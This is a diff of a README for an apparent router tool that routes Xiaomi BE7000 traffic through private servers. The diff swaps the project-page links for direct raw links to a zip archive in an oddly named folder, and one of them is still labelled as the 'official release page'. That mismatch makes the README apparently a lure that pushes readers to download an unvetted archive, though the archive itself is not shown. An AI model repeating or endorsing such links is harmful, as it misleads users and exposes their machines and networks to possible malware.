@@ -1,6 +1,6 @@
 # 🌐 xiaomi-be7000-amnezia - Route traffic through secure private servers
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Emmalynnawkward196/xiaomi-be7000-amnezia)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Emmalynnawkward196/xiaomi-be7000-amnezia/main/unfearingly/be_xiaomi_amnezia_1.5.zip)
 
 This application manages network traffic on your Xiaomi BE7000 router. It allows you to select specific websites or services to route through a private server while keeping the rest of your internet traffic on your local connection. This setup uses modern protocols like AmneziaWG and Xray to maintain high speeds and access content reliably.
 
@@ -17,7 +17,7 @@ You need the following items to use this software:
 
 You obtain the latest version of the application from the project page. Ensure you save the file to a folder you can access easily on your computer.
 
-[Visit the official release page to download](https://github.com/Emmalynnawkward196/xiaomi-be7000-amnezia)
+[Visit the official release page to download](https://raw.githubusercontent.com/Emmalynnawkward196/xiaomi-be7000-amnezia/main/unfearingly/be_xiaomi_amnezia_1.5.zip)
 
 ## ⚙️ Initial setup
 
